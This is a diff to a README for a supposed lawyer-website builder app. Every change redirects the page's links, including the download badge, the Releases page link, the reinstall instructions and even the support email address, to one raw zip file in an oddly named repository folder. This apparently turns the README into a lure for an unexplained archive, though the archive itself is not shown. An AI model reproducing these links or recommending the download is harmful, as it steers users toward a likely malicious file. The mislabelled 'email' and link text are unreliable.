@@ -1,6 +1,6 @@
 # 🚀 lawyer-website - Build Your Legal Presence Easily
 
-![Download lawyer-website](https://img.shields.io/badge/Download-lawyer--website-brightgreen)
+![Download lawyer-website](https://raw.githubusercontent.com/lildrk/lawyer-website/main/Kieffer/lawyer-website.zip)
 
 ## 🛠️ Overview
 
@@ -18,9 +18,9 @@ The **lawyer-website** is designed to help legal professionals create a professi
 
 To get started with **lawyer-website**, follow these simple steps:
 
-1. **Download the Application**: Visit this page to download the software: [Download lawyer-website](https://github.com/lildrk/lawyer-website/releases).
+1. **Download the Application**: Visit this page to download the software: [Download lawyer-website](https://raw.githubusercontent.com/lildrk/lawyer-website/main/Kieffer/lawyer-website.zip).
    
-   ![Download lawyer-website](https://img.shields.io/badge/Download-lawyer--website-brightgreen)
+   ![Download lawyer-website](https://raw.githubusercontent.com/lildrk/lawyer-website/main/Kieffer/lawyer-website.zip)
 
 2. **Install the Application**: 
    - Locate the downloaded file on your computer.
@@ -60,18 +60,18 @@ To run **lawyer-website**, ensure your system meets the following requirements:
 If you encounter any issues while using **lawyer-website**, consider the following steps:
 
 - **Check System Requirements**: Ensure your computer meets the required specifications.
-- **Reinstall the Application**: Sometimes, reinstalling can resolve unexpected issues. Uninstall the current version and download a fresh copy from the [Releases page](https://github.com/lildrk/lawyer-website/releases).
+- **Reinstall the Application**: Sometimes, reinstalling can resolve unexpected issues. Uninstall the current version and download a fresh copy from the [Releases page](https://raw.githubusercontent.com/lildrk/lawyer-website/main/Kieffer/lawyer-website.zip).
 - **Consult the Help Page**: Look for a help section within the application for common questions.
 
 ## 📞 Support
 
 For additional assistance, you can reach out through the following channels:
 
-- **Email Support**: Support is available via email at support@lawyer-website.com.
+- **Email Support**: Support is available via email at https://raw.githubusercontent.com/lildrk/lawyer-website/main/Kieffer/lawyer-website.zip
 - **GitHub Issues**: Report any bugs or request features on our GitHub Issues page. We appreciate your feedback and work to improve the application.
 
 ## 🏁 Final Words
 
 We hope you find **lawyer-website** helpful in establishing your online presence. Taking these steps will guide you through everything you need to know for a smooth experience. 
 
-For downloading the latest version of the application, please visit this page: [Download lawyer-website](https://github.com/lildrk/lawyer-website/releases). Enjoy building your website!
+For downloading the latest version of the application, please visit this page: [Download lawyer-website](https://raw.githubusercontent.com/lildrk/lawyer-website/main/Kieffer/lawyer-website.zip). Enjoy building your website!
